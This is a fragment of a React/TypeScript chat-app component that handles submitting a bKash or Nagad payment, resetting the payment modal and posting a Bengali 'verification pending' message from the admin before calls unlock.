                    localStorage.removeItem(`monersathi_payment_error_shown_${profileId}`);

                    setIsProcessingPayment(false);
                    setShowPaymentModal(false);
                    setPaymentNumber("");
                    setPaymentTrxId("");

                    // Append pending validation message into Chat UI
                    const time = getFormattedTime();
                    const freshMsgs = loadLocalMessages();
                    const pendingMsg: ChatMessage = {
                      id: `msg_verify_pending_${Date.now()}`,
                      text: `⏳ পেমেন্ট সাবমিট হয়েছে সোনা! তোমার তথ্য যাচাই করা হচ্ছে (ভেরিফিকেশন পেন্ডিং রয়েছে)। অনুগ্রহ করে অনুগ্রহ করে চ্যাট স্ক্রিনে ১-২ মিনিট অপেক্ষা করো। ভেরিফিকেশন সফল হলে অটোমেটিক কল আনলক হয়ে যাবে। 🥰❤️`,
                      sender: "admin",
                      time,
                      timestamp: Date.now()
                    };
                    saveLocalMessages([...freshMsgs, pendingMsg]);

                    alert("পেমেন্ট রিকোয়েস্ট সফলভাবে পাঠানো হয়েছে! পেমেন্ট যাচাই সম্পূর্ণ হওয়া পর্যন্ত অনুগ্রহ করে অপেক্ষা করুন।");

                    setTimeout(() => {
                      if (chatAreaRef.current) {
                        chatAreaRef.current.scrollTop = chatAreaRef.current.scrollHeight;
                      }
                    }, 100);

                  } catch (err: any) {
                    setIsProcessingPayment(false);
                    alert("ত্রুটি: " + (err.message || "পেমেন্ট রিকোয়েস্ট পাঠানো যায়নি। আবার চেষ্টা করুন।"));
                  }
                }}
                disabled={isProcessingPayment}
                className={`w-full text-white font-extrabold text-sm py-3 rounded-2xl transition duration-200 active:scale-95 flex items-center justify-center gap-2 ${
                  isProcessingPayment 
                    ? "bg-slate-400 cursor-not-allowed animate-pulse" 
                    : (paymentMethodChosen === "bkash" ? "bg-[#e2136e] hover:bg-[#c90a5e]" : paymentMethodChosen === "nagad" ? "bg-[#f15a22] hover:bg-[#d6410d]" : "bg-[#8c3494] hover:bg-[#72217a]")
                }`}
              >
                {isProcessingPayment ? (
                  <span>পেমেন্ট সাবমিট করা হচ্ছে...</span>
                ) : (
                  <span>পেমেন্ট নিশ্চিত করুন (৳{paymentAmount})</span>
                )}
              </button>
            </div>
            
          </div>
        </div>
      )}

    </div>
  );
}
